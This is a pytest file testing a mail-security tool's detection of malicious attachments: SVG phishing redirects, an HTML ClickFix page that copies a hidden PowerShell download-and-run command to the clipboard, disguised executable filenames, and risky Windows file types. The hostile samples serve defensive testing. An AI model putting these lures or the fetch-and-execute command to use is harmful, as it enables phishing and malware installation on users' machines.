"""Attachment checks added for the lure catalog: SVG phishing, HTML ClickFix,
filename tricks (RTLO, zero-width, look-alike dots, space padding) and the
newer "opens something else" file types."""

from __future__ import annotations

import pytest

from reddysec.analysis.attachments import attachment_signals, clean_filename, filename_tricks
from reddysec.analysis.trust import is_protected
from reddysec.models import Attachment


def att(name, data, ctype="application/octet-stream"):
    ext = name.rsplit(".", 1)[-1].lower() if "." in name else ""
    return Attachment(filename=name, content_type=ctype, size=len(data), sha256="0" * 64, declared_extension=ext, data=data)


def codes(sigs):
    return {s.code: s.weight for s in sigs}


SVG = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">{}</svg>'


class TestSvg:
    @pytest.mark.parametrize(
        "body",
        [
            '<script>window.location.href = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU=") + "#victim@example.com"</script>',
            '<script><![CDATA[eval(String.fromCharCode(108,111))]]></script>',
            '<foreignObject width="300" height="200"><form action="https://x.example"><input type="password"></form></foreignObject>',
            '<a href="data:text/html;base64,PGh0bWw+"><text>Open</text></a>',
            '<image href="x" onload="location.replace(\'https://evil.example\')"/>',
        ],
    )
    def test_svg_phish(self, body):
        sigs = attachment_signals(att("Fax_Message.svg", SVG.format(body).encode(), "image/svg+xml"))
        assert codes(sigs).get("attachment.svg_phish") == 70
        assert is_protected("attachment.svg_phish")

    def test_script_without_redirect_is_svg_script(self):
        sigs = attachment_signals(att("chart.svg", SVG.format("<script>var a = 1;</script>").encode(), "image/svg+xml"))
        assert "attachment.svg_script" in codes(sigs) and "attachment.svg_phish" not in codes(sigs)

    def test_plain_logo_is_clean(self):
        sigs = attachment_signals(att("logo.svg", SVG.format('<circle cx="5" cy="5" r="4" fill="red"/>').encode(), "image/svg+xml"))
        assert not {"attachment.svg_phish", "attachment.svg_script"} & set(codes(sigs))


HTML_CLICKFIX = b"""<!doctype html><html><body>
<h2>I'm not a robot</h2><p>Verification steps: Press Windows + R, press CTRL + V, press Enter</p>
<script>navigator.clipboard.writeText("powershell -w hidden -c \\"iwr https://x.example/a | iex\\"");</script>
</body></html>"""


class TestHtml:
    def test_html_clickfix(self):
        sigs = attachment_signals(att("Document_Review.html", HTML_CLICKFIX, "text/html"))
        assert codes(sigs)["attachment.html_clickfix"] == 90

    def test_html_clickfix_without_visible_command(self):
        data = HTML_CLICKFIX.replace(b"powershell -w hidden -c \\\"iwr https://x.example/a | iex\\\"", b"x")
        assert codes(attachment_signals(att("a.html", data, "text/html")))["attachment.html_clickfix"] == 70

    def test_instructions_without_clipboard_code_are_not_clickfix(self):
        data = b"<html><body>To see your version press Windows + R, type winver, press Enter.</body></html>"
        assert "attachment.html_clickfix" not in codes(attachment_signals(att("help.html", data, "text/html")))

    def test_base64_redirect_is_stronger(self):
        data = b'<html><script>window.location.href = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv");</script></html>'
        assert codes(attachment_signals(att("a.html", data, "text/html")))["attachment.html_redirect"] == 50
        plain = b'<html><script>window.location.href = "https://example.com/";</script></html>'
        assert codes(attachment_signals(att("b.html", plain, "text/html")))["attachment.html_redirect"] == 30


class TestFilenameTricks:
    @pytest.mark.parametrize(
        ("name", "trick"),
        [
            ("Invoice_‮fdp.exe", "right-to-left override"),
            ("Invo​ice.pdf.exe", "zero-width characters"),
            ("Invoice.pdf․exe", "look-alike dot"),
            ("Statement.pdf                    .exe", "space padding"),
        ],
    )
    def test_tricks(self, name, trick):
        assert trick in filename_tricks(name)
        sigs = codes(attachment_signals(att(name, b"MZ" + b"\x00" * 100)))
        assert sigs["attachment.filename_trick"] == 50
        assert "attachment.dangerous_type" in sigs or "attachment.executable_content" in sigs

    def test_lookalike_dot_reveals_real_extension(self):
        assert clean_filename("Invoice.pdf․exe") == "Invoice.pdf.exe"
        sigs = codes(attachment_signals(att("Invoice.pdf․exe", b"hello world text")))
        assert sigs["attachment.dangerous_type"] >= 70 and "attachment.double_extension" in sigs

    @pytest.mark.parametrize("name", ["Invoice 2026.pdf", "report.final.docx", "Résumé.pdf", "photo (1).jpg"])
    def test_ordinary_names(self, name):
        assert filename_tricks(name) == []


class TestNewDangerousTypes:
    @pytest.mark.parametrize(
        ("name", "data", "weight"),
        [
            ("Teams.appinstaller", b'<?xml version="1.0"?><AppInstaller Uri="https://x.example/a"/>', 70),
            ("search.searchConnector-ms", b"<searchConnectorDescription/>", 70),
            ("docs.library-ms", b"<libraryDescription/>", 70),
            ("Update.msix", b"PK\x03\x04" + b"\x00" * 30, 65),
            ("open.url", b"[InternetShortcut]\r\nURL=file://x.example/share/a.exe", 60),
            ("disk.vhdx", b"vhdxfile" + b"\x00" * 100, 70),
        ],
    )
    def test_types(self, name, data, weight):
        sigs = codes(attachment_signals(att(name, data)))
        assert sigs.get("attachment.dangerous_type", 0) >= weight
